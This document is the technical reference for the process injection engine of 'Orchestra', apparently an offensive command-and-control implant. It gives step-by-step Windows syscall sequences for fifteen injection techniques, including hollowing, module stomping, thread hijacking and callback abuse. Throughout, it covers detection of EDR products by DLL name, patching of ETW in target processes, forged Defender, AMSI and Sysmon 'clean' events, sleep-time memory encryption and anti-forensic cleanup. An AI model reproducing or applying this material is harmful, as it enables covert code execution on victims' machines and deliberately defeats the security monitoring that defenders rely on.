# Injection Engine — Deep Dive

Complete reference for Orchestra's process injection engine: all techniques, pre-injection reconnaissance, decision flowchart, memory layouts, syscall sequences, handle management, cleanup, and sleep enrollment.

---

## Overview

The injection engine (`agent/src/injection/` — Windows, gated by `#[cfg(target_os = "windows")]`) provides multiple techniques for injecting code into remote processes. It automatically selects the best technique based on target process reconnaissance.

### Techniques Summary

| Technique | Stealth | Reliability | Complexity | Best For |
|-----------|---------|-------------|------------|----------|
| **Process Hollowing** | High | High | Medium | Long-lived payloads |
| **Transacted Hollowing** | Very High | High | High | Fileless hollowing with ETW blinding |
| **Phantom DLL Hollowing** | Very High | Medium | High | Section-backed DLL hollowing without a dropped file |
| **Delayed Module Stomping** | Very High | High | High | Defeating module-load timing heuristics |
| **Module Stomping** | Very High | High | High | Blending with loaded modules |
| **Existing-Module Stomping** | Very High | Medium | Medium | Avoiding fresh image-load callbacks |
| **Early Bird APC** | Medium | High | Low | Suspended/new processes |
| **Thread Hijacking** | Very High | Medium | High | Avoiding new thread creation |
| **Waiting Thread Hijack** | Very High | Medium | High | Return-address overwrite on already-waiting threads |
| **ThreadPool Injection** (8 variants) | Very High | Medium | High | Avoiding thread creation entirely |
| **Fiber Injection** | Very High | Medium | High | Legitimate execution context |
| **Context-Only Injection** | Very High | Medium | Low | Quick instruction-pointer redirect with restore trampoline |
| **Section Mapping Injection** | Very High | High | Medium | Dual-mapped shared sections |
| **NtSetInformationProcess Write Bypass** | High | Medium | High | Avoiding `NtWriteVirtualMemory` on supported builds |
| **Callback Injection** (12 APIs) | Very High | Medium | Medium | Legitimate API callback dispatch |

---

## Pre-Injection Reconnaissance

Before any injection, the engine performs reconnaissance on the target process:

### Process Assessment

```rust
pub struct ProcessRecon {
    pub pid: u32,
    pub name: String,
    pub is_protected: bool,     // Protected Process Light
    pub is_elevated: bool,      // Running as SYSTEM/Admin
   pub arch: String,           // normalized process architecture
    pub module_count: usize,
    pub has_edr_modules: bool,  // Known EDR DLLs detected
    pub edr_names: Vec<String>, // Names of detected EDR modules
    pub thread_count: usize,
    pub session_id: u32,
    pub integrity_level: IntegrityLevel,
}

pub enum IntegrityLevel {
    Low,
    Medium,
    High,
    System,
}
```

### Reconnaissance Checks

1. **Architecture match** — Injection only works if source and target are the same architecture
2. **Protection level** — Protected Process Light (PPL) processes cannot be injected
3. **EDR detection** — Checks for known EDR DLLs (CrowdStrike, SentinelOne, Carbon Black, Defender ATP, etc.)
4. **Integrity level** — Cannot inject into higher-integrity processes without privilege escalation
5. **Session ID** — Cross-session injection requires additional token manipulation

### Module Enumeration

```rust
fn enumerate_modules(process_handle: HANDLE) -> Vec<ModuleInfo> {
    // Uses NtQueryVirtualMemory + NtReadVirtualMemory
    // Walks PEB → LDR_DATA_TABLE_ENTRY → InMemoryOrderModuleList
    // Extracts: base address, size, name, timestamp
}
```

### EDR Detection Heuristics

Known EDR module name patterns (checked case-insensitively):

| EDR | Module Pattern |
|-----|----------------|
| CrowdStrike Falcon | `CS*.dll`, `CSPM.dll` |
| SentinelOne | `S1*.dll`, `Sentinel*.dll` |
| Carbon Black | `CB*.dll`, `RepMgr*.dll` |
| Microsoft Defender ATP | `MpCmdRun*`, `MsSense*` |
| Cortex XDR | `Cyver*`, `xdr*.dll` |
| CrowdStrike | `CSFalcon*.dll` |
| FireEye | `xagt*.dll` |

---

## Technique Decision Flowchart

```
                    ┌─────────────────┐
                    │ Target Process  │
                    │ Recon           │
                    └────────┬────────┘
                             │
                    ┌────────▼────────┐
                    │ Protected?      │──── Yes ──► Fail (cannot inject)
                    └────────┬────────┘
                             │ No
                    ┌────────▼────────┐
                    │ EDR Detected?   │──── Yes ──► Prefer stealthy:
                    └────────┬────────┘             WTH / ContextOnly /
                             │ No                   SectionMapping / callbacks
                    ┌────────▼────────┐
                    │ Suspended       │──── Yes ──► Early Bird APC
                    │ process?        │             or Process Hollow
                    └────────┬────────┘
                             │ No
                    ┌────────▼────────┐
                    │ Need persistent │──── Yes ──► Module Stomping
                    │ presence?       │             (blends with modules)
                    └────────┬────────┘
                             │ No
                    ┌────────▼────────┐
                    │ Default         │──────────► Thread Hijacking
                    │                 │            or Process Hollow
                    └─────────────────┘
```

---

## Technique Details

### 1. Process Hollowing (`hollowing` crate)

Replaces the main module of a legitimate process with the payload:

#### Memory Layout

```
Before hollowing:
┌──────────────────────┐ 0x00400000
│ legitimate.exe       │
│ ┌──────┐             │
│ │ .text│ (original)  │
│ ├──────┤             │
│ │ .rdata│            │
│ ├──────┤             │
│ │ .data │            │
│ └──────┘             │
└──────────────────────┘

After hollowing:
┌──────────────────────┐ 0x00400000
│ hollowed process     │
│ ┌──────┐             │
│ │ .text│ (payload)   │
│ ├──────┤             │
│ │ .rdata│ (payload)  │
│ ├──────┤             │
│ │ .data │ (payload)  │
│ └──────┘             │
└──────────────────────┘
```

#### Syscall Sequence

```
1. CreateProcessW(szTargetPath, CREATE_SUSPENDED)
   → process_handle, thread_handle

2. NtQueryVirtualMemory(process_handle, ImageBase)
   → base_address of main module

3. NtReadVirtualMemory(process_handle, base_address)
   → Read original PE headers (for entry point extraction)

4. NtUnmapViewOfSection(process_handle, base_address)
   → Unmap original executable from memory

5. NtAllocateVirtualMemory(process_handle, base_address, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
   → Allocate memory at same base address

6. NtWriteVirtualMemory(process_handle, base_address, payload_headers)
   → Write PE headers

7. NtWriteVirtualMemory(process_handle, section_va, section_data)
   → Write each PE section

8. NtProtectVirtualMemory(process_handle, section_va, original_protection)
   → Restore original section protections (RW→RX for .text, RW for .data)

9. NtWriteVirtualMemory(process_handle, image_base_offset, &base_address)
   → Update PEB ImageBaseAddress to new base

10. SetThreadContext(thread_handle, {IP: new_entry_point})
    → Redirect execution to payload entry point

11. NtResumeThread(thread_handle)
    → Resume execution (payload runs inside legitimate process)
```

#### Handle Cleanup

```rust
fn cleanup(process_handle: HANDLE, thread_handle: HANDLE) {
    // Close handles only, do not terminate the process
    NtClose(thread_handle);
    NtClose(process_handle);
}
```

---

### 2. NTFS Transaction-Based Process Hollowing (`transacted-hollowing` feature)

Like standard process hollowing, but uses an NTFS transaction to make the payload completely fileless on disk. The section mapping persists after the transaction is rolled back, but the file never existed.

#### Attack Flow

```
1. NtCreateTransaction()
   → transaction_handle
   (fallback: RtlCreateTransaction via kernel32 ordinal)

2. NtCreateFile(transaction_handle, temp_path, ...)
   → Create file inside the transaction (not visible on disk)

3. NtWriteFile(file_handle, payload)
   → Write payload to transacted file

4. NtCreateSection(SEC_COMMIT, pagefile-backed)
   → section_handle (backed by transaction)

5. NtMapViewOfSection(section_handle, CURRENT_PROCESS, PAGE_READWRITE)
   → local_view
   memcpy(local_view, payload)
   NtUnmapViewOfSection(CURRENT_PROCESS, local_view)

6. CreateProcessW(target_path, CREATE_SUSPENDED)
   → process_handle, thread_handle

7. [ETW Blinding] Patch EtwEventWrite in TARGET process ntdll:
   NtReadVirtualMemory → find remote ntdll export
   NtWriteVirtualMemory → overwrite first byte with 0xC3 (ret)

8. NtMapViewOfSection(section_handle, target_process, PAGE_EXECUTE_READ)
   → remote_base (payload mapped into target as RX)

9. SetThreadContext(thread_handle, {IP: remote_base + entry_point})
   → Redirect execution

10. NtRollbackTransaction(transaction_handle)
    → Transaction rolled back, file never existed on disk
    → Section mapping in target process remains valid

11. [ETW Restore] Restore original EtwEventWrite byte in target

12. NtResumeThread(thread_handle)
    → Payload executes inside legitimate process
```

#### Why It's Fileless

The key insight is that Windows allows section mappings to survive transaction rollback:

```
Timeline:
  CreateTransaction  ─────────────────────────────────────┐
  CreateFile (in txn) ────────────────────────────────────┤
  WriteFile (payload) ────────────────────────────────────┤  ← File exists
  CreateSection (SEC_COMMIT) ─────────────────────────────┤     only in
  MapViewIntoTarget ──────────────────────────────────────┤     transaction
  RollbackTransaction ────────────────────────────────────┘  ← File GONE
  ResumeThread ──────────────────────────────────────────────  ← Section VALID
```

After rollback, no artifact exists on disk, but the section mapping in the target process remains valid because the memory manager holds a reference to the section object.

#### ETW Blinding Details

Remote ETW patching is performed on the **target** process (not the agent):

1. **Find remote ntdll** — Use shared ASLR base (ntdll is at the same address in all processes on modern Windows)
2. **Walk remote PE export table** — Read DOS header → PE header → export directory via `NtReadVirtualMemory`
3. **Resolve `EtwEventWrite`** — Binary search the export name table
4. **Patch** — Write `0xC3` (RET) to first byte via `NtWriteVirtualMemory`
5. **Fake events** — Emit 5 spoofed ETW events with Defender/AMSI/Sysmon provider GUIDs
6. **Restore** — Write original byte back after `NtResumeThread`

#### Fake ETW Events

| Event | Provider GUID | Description |
|-------|--------------|-------------|
| Defender Scan Start | `{11cd958a-c507-4ef3-b3f2-5fd9dfbd2c78}` | Fake quick scan started |
| AMSI Scan Clean | `{79f7af20-2b5e-4cb1-8b6e-396376e8f8e8}` | Content marked as clean |
| Sysmon Process Create | `{5770385f-c22a-43e0-bf4c-06f5698ffbd9}` | Benign process creation |
| Defender No Threats | `{11cd958a-c507-4ef3-b3f2-5fd9dfbd2c78}` | Scan completed, no threats |
| Sysmon Network Connect | `{5770385f-c22a-43e0-bf4c-06f5698ffbd9}` | Legitimate network connection |

#### Auto-Selection Ranking

```
WTH > ContextOnly > SectionMapping > NtSetInfoProcess > CallbackInjection
   > TransactedHollowing > PhantomDllHollow > ProcessHollow
   > DelayedModuleStomp > ExistingModuleStomp > ModuleStomp
   > EarlyBirdApc > ThreadPool > ThreadHijack > FiberInject
```

Target-specific branches move a few entries to better match common process
roles, but they all use the same 15 `InjectionTechnique` variants and the same
fallback pipeline.

`TransactedHollowing` is ranked above standard `ProcessHollow` because it leaves no disk artifacts. The `prefer-over-hollowing` config flag (default: true) controls this.

`DelayedModuleStomp` is ranked above standard `ModuleStomp` because it defeats EDR timing heuristics by waiting for the initial-scan window to pass before stomping. The `prefer-over-stomp` config flag (default: true) controls this.

#### Configuration

```toml
[transacted-hollowing]
enabled = true
prefer-over-hollowing = true
etw-blinding = true
rollback-timeout-ms = 5000
```

#### Feature Flag

```toml
transacted-hollowing = ["direct-syscalls"]
```

Requires `direct-syscalls` because it uses `get_syscall_id` + `do_syscall` for all NT API calls.

---

### 3. Phantom DLL Hollowing (`phantom-dll-hollow` feature)

Maps a DLL image through `NtCreateSection` / `NtMapViewOfSection`, creates a
suspended host process, unmaps the host image, maps the phantom section into the
host, fixes relocations and imports, updates the PEB image base, then resumes.
The target process still looks backed by a legitimate on-disk executable, while
the executed image came from an in-memory section.

#### Key Properties

- Uses section-based memory management instead of `VirtualAlloc` / `VirtualAllocEx`
- Avoids dropping the phantom DLL payload to disk
- Ranked above standard process hollowing when the feature is enabled
- Windows x86_64 only and gated by `phantom-dll-hollow`

#### Feature Flag

```toml
phantom-dll-hollow = ["direct-syscalls"]
```

---

### 4. Delayed Module Stomping (Delayed Module Overloading)

Two-phase variant of module stomping that defeats EDR timing heuristics. Loads a sacrificial DLL, waits for a configurable randomized delay (default 8–15 seconds), then overwrites the DLL's `.text` section with the payload.

#### Why Delayed?

Many EDR products record DLL load times and flag modules whose code changes within a short window after `LoadLibrary` returns. The delayed stomp waits well beyond the typical 1–3 second scan window so the `.text` modification blends into normal background memory activity.

#### Two-Phase Syscall Sequence

**Phase 1 (immediate — returns to caller):**

```
1. NtOpenProcess(PROCESS_ALL_ACCESS, target_pid)
   → process_handle

2. NtQueryInformationProcess(ProcessBasicInformation)
   → PEB address → walk Ldr.InMemoryOrderModuleList
   → enumerate loaded modules

3. Select sacrificial DLL NOT already loaded
   (from ~30 candidates: version.dll, dwmapi.dll, msctf.dll, ...)

4. NtAllocateVirtualMemory(path_buf, MEM_COMMIT, PAGE_READWRITE)
   NtWriteVirtualMemory(dll_path)
   NtCreateThreadEx(LoadLibraryA, path_buf)
   NtWaitForSingleObject(thread) — wait for DLL to load
   NtFreeVirtualMemory(path_buf)

5. Re-enumerate modules to find loaded DLL base address

→ Returns JSON: { status: "phase1_complete", target_pid, dll_name,
                   dll_base, delay_secs }
```

**Phase 2 (background thread, after delay):**

```
6. Read DOS header → NT headers → section table
   Find .text section (first executable section)

7. NtProtectVirtualMemory(.text, PAGE_EXECUTE_READWRITE)
   NtWriteVirtualMemory(.text, payload)
   NtProtectVirtualMemory(.text, PAGE_EXECUTE_READ)
   → Stomp .text section with payload

8. If PE payload:
   Parse relocation directory from payload buffer
   Apply IMAGE_REL_BASED_DIR64 / HIGHLOW fixups
   Entry = dll_base + payload.entry_point_rva
   If shellcode:
   Entry = .text section start

9. NtCreateThreadEx(entry_point)
   → Execute payload in target process
```

#### Evasion Properties

| Property | Mechanism |
|----------|-----------|
| **Timing heuristic bypass** | 8–15s delay defeats "code changed shortly after load" |
| **Legitimate module appearance** | Payload runs from a normally loaded DLL |
| **Indirect syscalls** | All NT API calls via `do_syscall` through gadgets |
| **No new allocations** | Reuses existing DLL memory (no alloc triad) |
| **Non-blocking** | Phase 2 runs in background thread |

#### Configuration

```toml
[delayed-stomp]
enabled = true
min-delay-secs = 8
max-delay-secs = 15
prefer-over-stomp = true
sacrificial-dlls = ["version.dll", "dwmapi.dll", "msctf.dll"]
```

#### Feature Flag

```toml
delayed-stomp = ["direct-syscalls"]
```

---

### 5. Module Stomping (Module Overloading)

Loads a legitimate DLL, then overwrites its memory with the payload. The payload appears as a legitimate loaded module in the process's module list.

#### Syscall Sequence

```
1. OpenProcess(PROCESS_ALL_ACCESS, FALSE, target_pid)
   → process_handle

2. NtAllocateVirtualMemory(process_handle, path_buf, MEM_COMMIT, PAGE_READWRITE)
   → Allocate buffer for DLL path

3. NtWriteVirtualMemory(process_handle, path_buf, legitimate_dll_path)
   → Write DLL path (e.g., "C:\Windows\System32\amsi.dll")

4. CreateRemoteThread(process_handle, LoadLibraryW, path_buf)
   → Load legitimate DLL in target

5. WaitForSingleObject(remote_thread, INFINITE)
   → Wait for DLL to load

6. NtQueryVirtualMemory(process_handle, ModuleBase)
   → Find loaded module base address

7. NtProtectVirtualMemory(process_handle, module_base, PAGE_READWRITE)
   → Make module memory writable

8. NtWriteVirtualMemory(process_handle, module_base, payload)
   → Overwrite module with payload

9. NtProtectVirtualMemory(process_handle, module_base, PAGE_EXECUTE_READ)
   → Set to executable

10. CreateRemoteThread(process_handle, payload_entry, NULL)
    → Execute payload
```

#### Advantages

- Payload appears as a legitimate module (e.g., `amsi.dll`)
- Module is in the PEB's module list
- No unexplained memory regions
- **Very effective against memory scanners** that compare loaded modules against disk

---

### 6. Existing-Module Stomping

Existing-module stomping reuses a DLL that is already loaded in the target
process. It follows the same overwrite-and-execute idea as module stomping, but
it never calls `LoadLibrary` / `LdrLoadDll`, so there is no new image-load kernel
callback and no new PEB loader entry to explain.

#### Selection Notes

- Preferred when maximum stealth is required and a suitable loaded module exists
- Uses module enumeration plus exclusion patterns from `[injection]`
- Falls back to normal module stomping when no already-loaded candidate is viable

---

### 7. Early Bird APC Injection

Queues an APC to a thread in a newly created (suspended) process. The APC executes before the process's main thread starts.

#### Syscall Sequence

```
1. CreateProcessW(target_path, CREATE_SUSPENDED)
   → process_handle, thread_handle

2. NtAllocateVirtualMemory(process_handle, NULL, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
   → alloc_base

3. NtWriteVirtualMemory(process_handle, alloc_base, shellcode)
   → Write payload

4. NtProtectVirtualMemory(process_handle, alloc_base, PAGE_EXECUTE_READ)
   → Make executable

5. QueueUserAPC((PAPCFUNC)alloc_base, thread_handle, 0)
   → Queue APC to main thread

6. NtResumeThread(thread_handle)
   → Thread resumes, APC fires before main()
```

#### Advantages

- Very fast — no need to wait for process initialization
- APC fires in the context of the process's primary thread
- No additional thread creation

---

### 8. Thread Hijacking

Hijacks an existing thread in the target process by modifying its context (register state) to redirect execution.

#### Syscall Sequence

```
1. OpenProcess(PROCESS_ALL_ACCESS, FALSE, target_pid)
   → process_handle

2. NtAllocateVirtualMemory(process_handle, NULL, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
   → alloc_base

3. NtWriteVirtualMemory(process_handle, alloc_base, shellcode)
   → Write payload

4. NtProtectVirtualMemory(process_handle, alloc_base, PAGE_EXECUTE_READ)
   → Make executable

5. CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, target_pid)
   → snapshot_handle

6. Thread32First/Next → Find suitable thread (not the current thread)
   → thread_id

7. OpenThread(THREAD_ALL_ACCESS, FALSE, thread_id)
   → thread_handle

8. SuspendThread(thread_handle)
   → Suspend target thread

9. GetThreadContext(thread_handle, &context)
   → Save original context

10. context instruction pointer = alloc_base
    → Set instruction pointer to payload

11. SetThreadContext(thread_handle, &context)
    → Apply modified context

12. ResumeThread(thread_handle)
    → Thread resumes at payload address
```

#### Advantages

- No new thread creation — EDR products often monitor `NtCreateThreadEx`
- Execution happens in the context of a legitimate thread
- The hijacked thread's call stack appears legitimate

---

### 9. Waiting Thread Hijack

Targets a thread that is already blocked in a kernel wait state, reads the
thread stack to locate a return address, and overwrites that return address with
the payload address. When the wait resolves naturally, the thread returns into
the payload without a suspend/resume transition or direct context modification.

#### Advantages

- Avoids `SuspendThread` / `ResumeThread` telemetry
- Avoids creating a new remote thread
- Complements Context-Only injection: WTH changes a stack return address;
   Context-Only changes register context

---

### 10. ThreadPool Injection

Injects shellcode by queuing work items to the target process's thread pool. No new thread creation, no remote thread creation — the process's own thread pool threads execute the payload.

#### Syscall Sequence

```
1. OpenProcess(PROCESS_ALL_ACCESS, FALSE, target_pid)
   → process_handle

2. NtAllocateVirtualMemory(process_handle, NULL, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
   → alloc_base

3. NtWriteVirtualMemory(process_handle, alloc_base, shellcode)
   → Write payload

4. NtProtectVirtualMemory(process_handle, alloc_base, PAGE_EXECUTE_READ)
   → Make executable

5. CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, target_pid)
   → Find a thread pool thread (heuristic: waits on TpAllocWork-related objects)

6. QueueUserAPC((PAPCFUNC)alloc_base, thread_handle, 0)
   → Queue to thread pool thread

   OR

7. NtWriteVirtualMemory(process_handle, callback_addr, &alloc_base)
   → Write function pointer to callback slot

8. TpPostWork(work_item)
   → Post work item to trigger execution
```

#### Advantages

- **Highest stealth** — no `NtCreateThreadEx`, no `CreateRemoteThread`
- Execution happens in legitimate thread pool worker threads
- Very difficult for EDR to distinguish from normal thread pool activity

---

### 11. Fiber Injection

Converts a thread to a fiber, creates a new fiber with the payload, and switches to it. Fibers are user-mode scheduled and don't trigger kernel thread creation alerts.

#### Syscall Sequence

```
1. OpenProcess(PROCESS_ALL_ACCESS, FALSE, target_pid)
   → process_handle

2. NtAllocateVirtualMemory(process_handle, NULL, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
   → alloc_base

3. NtWriteVirtualMemory(process_handle, alloc_base, shellcode)
   → Write payload

4. NtProtectVirtualMemory(process_handle, alloc_base, PAGE_EXECUTE_READ)
   → Make executable

5. CreateRemoteThread(process_handle, fiber_payload, NULL)
   → Create thread that:

   a. ConvertThreadToFiber(NULL)
      → fiber_context

   b. CreateFiber(0, (LPFIBER_START_ROUTINE)alloc_base, NULL)
      → payload_fiber

   c. SwitchToFiber(payload_fiber)
      → Execute payload as fiber
```

#### Advantages

- Fiber execution is invisible to most EDR thread monitoring
- No kernel thread creation — all user-mode scheduling
- Legitimate use case (Windows uses fibers for SQL Server, etc.)

---

### 10a. ThreadPool Injection — Extended Variants

The ThreadPool injection technique has been expanded to **8 sub-variants**, each
using a different thread pool work-dispatch mechanism. This variety allows the
operator to select the variant least likely to be monitored by a given EDR product.

| Variant | Dispatch Path | Notes |
|---------|---------------|-------|
| `Work` | `TpAllocWork` + `TpPostWork` | Classic work item |
| `WorkerFactory` | Worker factory pending queue | Manipulates factory work-list pointers |
| `Timer` | `TP_TIMER` callback | Timer-triggered worker execution |
| `IoCompletion` | `TP_IO` + IOCP packet | Completion-port dispatch |
| `Wait` | `TP_WAIT` callback | Event/wait-triggered dispatch |
| `Alpc` | `TP_ALPC` callback | ALPC port-based dispatch |
| `Direct` | Fake `TP_TASK` posted to IOCP | Direct worker dispatch |
| `AsyncIo` | `TP_DIRECT` + `NtSetIoCompletion` | Simplest async I/O callback path |

#### Selection Logic

The engine automatically selects the variant based on target process reconnaissance:

1. If the target already has an I/O completion port → use `IoCompletion` or `AsyncIo`
2. If the target has ALPC ports → use `Alpc`
3. If the target has timer objects → use `Timer`
4. Default: `Work` (most common, broadest compatibility)

---

### 12. Context-Only Injection

Performs a minimal thread-context hijack without creating a new remote thread.
The engine snapshots a suitable thread, writes the payload plus an
architecture-native restore trampoline to stack space or executable slack, and
redirects the thread's instruction pointer through `SetThreadContext`. On x64
the helper uses RIP/RSP/RBP; on ARM64 it uses PC/SP/FP.

#### Syscall Sequence

```
1. OpenProcess(PROCESS_ALL_ACCESS, FALSE, target_pid)
   → process_handle

2. NtGetContextThread(thread_handle, &context)
   → Save original context

3. context instruction pointer = payload_address
   → Redirect execution

4. NtSetContextThread(thread_handle, &context)
   → Apply modified context

5. NtResumeThread(thread_handle, NULL)
   → Thread resumes at payload_address
```

#### Advantages

- Zero memory allocation — nothing suspicious in virtual memory
- Zero memory writes — no `NtWriteVirtualMemory` calls
- Only a single `NtSetContextThread` syscall (plus `NtGetContextThread`)
- Best OPSEC when payload already exists in target (e.g., module stomping already done)

---

### 13. Section Mapping Injection

Creates a shared section object (via `NtCreateSection`), maps it into both the
agent and the target process, and writes the payload via the local mapping.
The target process accesses it via the remote mapping. This avoids
`NtWriteVirtualMemory` entirely.

#### Syscall Sequence

```
1. NtCreateSection(&section_handle, SECTION_ALL_ACCESS, NULL,
      &size, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL)
   → Create shared section

2. NtMapViewOfSection(section_handle, NtCurrentProcess(), &local_base, ...)
   → Map into agent (RW)

3. memcpy(local_base, shellcode, shellcode_len)
   → Write payload locally

4. NtMapViewOfSection(section_handle, target_process, &remote_base, ...)
   → Map into target (RX)

5. NtClose(section_handle)
   → Clean up section handle

6. CreateRemoteThread(target_process, remote_base, NULL)
   → Execute in target
```

#### Advantages

- No `NtWriteVirtualMemory` — EDR commonly hooks this
- Section objects are used legitimately for shared memory IPC
- The section can be mapped with different permissions in each process
- `NtMapViewOfSection` from `\KnownDlls` is a common legitimate pattern

---

### 14. NtSetInformationProcess Write Bypass

Uses the undocumented `ProcessReadWriteVm` (`0x6A`) information class through
`NtSetInformationProcess` to copy payload bytes into the target via the kernel's
memory-copy path. On unsupported builds it falls back to `ProcessVmOperation`
(`0x6B`) or the indirect-syscall `NtWriteVirtualMemory` path.

#### Advantages

- Avoids the standard `NtWriteVirtualMemory` cross-process write signal on
   supported Windows 10/11 builds
- Keeps execution inside the same unified auto-selection and fallback pipeline
- Uses indirect syscall infrastructure for all NT API calls

---

### 15. Callback Injection (12 APIs)

Abuses legitimate Windows API functions that accept function-pointer callbacks.
The payload address is supplied as the callback; when the API invokes it, the
payload executes in the context of the calling thread.

| # | API | Trigger | Callback Param |
|---|-----|---------|---------------|
| 1 | `EnumChildWindows` | Window enumeration | `WNDENUMPROC` |
| 2 | `EnumSystemLocalesA` | Locale enumeration | `LOCALE_ENUMPROC` |
| 3 | `EnumWindows` | Top-level window enumeration | `WNDENUMPROC` |
| 4 | `EnumDesktopWindows` | Desktop window enumeration | `WNDENUMPROC` |
| 5 | `CreateTimerQueueTimer` | One-shot timer callback | `WAITORTIMERCALLBACK` |
| 6 | `EnumTimeFormatsA` | Locale time-format enumeration | `TIMEFMT_ENUMPROCA` |
| 7 | `EnumResourceTypesW` | Resource type enumeration | `ENUMRESTYPEPROC` |
| 8 | `EnumFontFamilies` | Font-family enumeration | `FONTENUMPROC` |
| 9 | `CertEnumSystemStore` | Certificate store enumeration | `PFN_CERT_ENUM_SYSTEM_STORE` |
| 10 | `SHEnumerateUnreadMailAccounts` | Shell unread-mail enumeration | `SHENUMUNREADMAILACCOUNTS` |
| 11 | `EnumerateLoadedModules` | DbgHelp module enumeration | `PENUMLOADED_MODULES_CALLBACK64` |
| 12 | `CopyFileEx` | Copy progress callback | `LPPROGRESS_ROUTINE` |

#### Selection Logic

1. If a desktop/window exists in the target → prefer window-based callbacks
2. If GUI resources are available → prefer font and desktop enumeration paths
3. If no GUI → use locale, resource, certificate-store, or DbgHelp callbacks
4. For timer-based dispatch → use `CreateTimerQueueTimer`

#### Advantages

- All 12 APIs are legitimate Windows functions with callback parameters
- EDR must hook all 12 APIs to detect this technique (computationally expensive)
- Callbacks execute in the caller's thread — no remote thread creation
- Extremely difficult to distinguish from legitimate enumeration calls

---

## InjectionViability Assessment

The engine classifies each target process with a viability rating:

```rust
pub enum InjectionViability {
    /// Injection is safe and likely to succeed
    Viable,
    /// Injection may work but with caveats (e.g., EDR present but bypassable)
    Possible(String),
    /// Injection is not recommended (e.g., system process, protected)
    NotRecommended(String),
    /// Injection will fail (e.g., architecture mismatch, protected process)
    NotPossible(String),
}
```

### Assessment Criteria

| Factor | Viable | Possible | Not Recommended | Not Possible |
|--------|--------|----------|-----------------|--------------|
| Architecture | Match | — | Mismatch | — |
| Protection | None | — | — | PPL/PPL-PS |
| Integrity | ≤ Target | — | System process | — |
| EDR | None | Bypassable | Heavy hooks | — |
| Session | Same | — | Different session | — |
| Process State | Active | Suspended | — | Zombie |

---

## Sleep Enrollment (Remote Sleep Obfuscation)

After injection, the agent can enroll the injected payload in the sleep obfuscation cycle. This means the payload's memory is encrypted during sleep periods, just like the agent's own memory.

### Enrollment Process

```
1. Agent allocates memory in target process for payload
2. Agent calls MemoryGuard::register_remote(region, process_handle)
3. During each sleep cycle:
   a. Agent encrypts its own memory regions
   b. Agent uses NtWriteVirtualMemory to encrypt remote payload memory
   c. Agent sleeps (NtDelayExecution)
   d. Agent decrypts its own memory
   e. Agent uses NtWriteVirtualMemory to decrypt remote payload memory
4. Remote payload wakes up with decrypted memory
```

### Key Management for Remote Regions

- Remote regions use the same XChaCha20-Poly1305 key as the agent
- The key is transmitted to the remote payload via a shared memory region or encrypted control channel
- The remote payload stores the key in XMM14/XMM15 (same as the agent)

---

## Handle Management

All handles are carefully managed to avoid leaking:

```rust
struct HandleGuard {
    handle: HANDLE,
}

impl Drop for HandleGuard {
    fn drop(&mut self) {
        if self.handle != INVALID_HANDLE_VALUE && self.handle != null_mut() {
            unsafe { NtClose(self.handle); }
        }
    }
}
```

- **RAII wrappers** ensure handles are closed even on error paths
- **NtClose** is used (not CloseHandle) to avoid user-mode hooks
- **Double-close protection** — handles are set to `null_mut()` after closing

---

## Cleanup and Anti-Forensics

After successful injection:

1. **Zero allocation buffers** — Shellcode staging buffers are zeroed with `SecureZeroMemory`
2. **Close all handles** — Process, thread, and snapshot handles
3. **Free temporary allocations** — NtFreeVirtualMemory for staging areas
4. **Restore original protections** — Any temporarily modified memory pages
5. **No persistent handles** — The injected code has no open handles from the injector

---

## Error Handling

The injection engine uses detailed error types:

```rust
pub enum InjectionError {
    OpenProcessFailed(String),
    AllocationFailed(String),
    WriteFailed(String),
    ProtectionChangeFailed(String),
    ThreadCreationFailed(String),
    ThreadHijackFailed(String),
    ModuleNotFound(String),
    ArchitectureMismatch,
    ProtectedProcess,
    ElevatedPrivilegesRequired,
    RemoteError(String),
}
```

Each error includes a human-readable description and the failing NTSTATUS code where applicable.

---

## Feature Flags

| Feature | Effect |
|---------|--------|
| `default` | Process Hollowing + Early Bird APC |
| `module-stomp` | Enables Module Stomping technique |
| `thread-hijack` | Enables Thread Hijacking technique |
| `threadpool-inject` | Enables ThreadPool injection technique (8 variants) |
| `fiber-inject` | Enables Fiber injection technique |
| `context-only` | Enables Context-Only injection technique |
| `section-map` | Enables Section Mapping injection technique |
| `callback-inject` | Enables Callback injection technique (12 APIs) |
| `transacted-hollowing` | Enables NTFS transaction-based process hollowing with ETW blinding |
| `direct-syscalls` | All techniques use direct syscalls via `nt_syscall` crate |

---

## Cross-Platform Notes

The injection engine is Windows-only. On Linux, a limited injection capability exists via `memfd_create` and `process_vm_writev`:

1. Create anonymous file with `memfd_create`
2. Write payload to the memfd
3. Use `process_vm_writev` to inject shellcode
4. Create remote thread via `clone` syscall

This is significantly more limited than the Windows injection engine and is primarily used for P2P agent migration.

---

## See Also

- [ARCHITECTURE.md](ARCHITECTURE.md) — Agent internals and module initialization
- [SLEEP_OBFUSCATION.md](SLEEP_OBFUSCATION.md) — Sleep obfuscation and memory encryption
- [SECURITY.md](SECURITY.md) — OPSEC considerations for injection
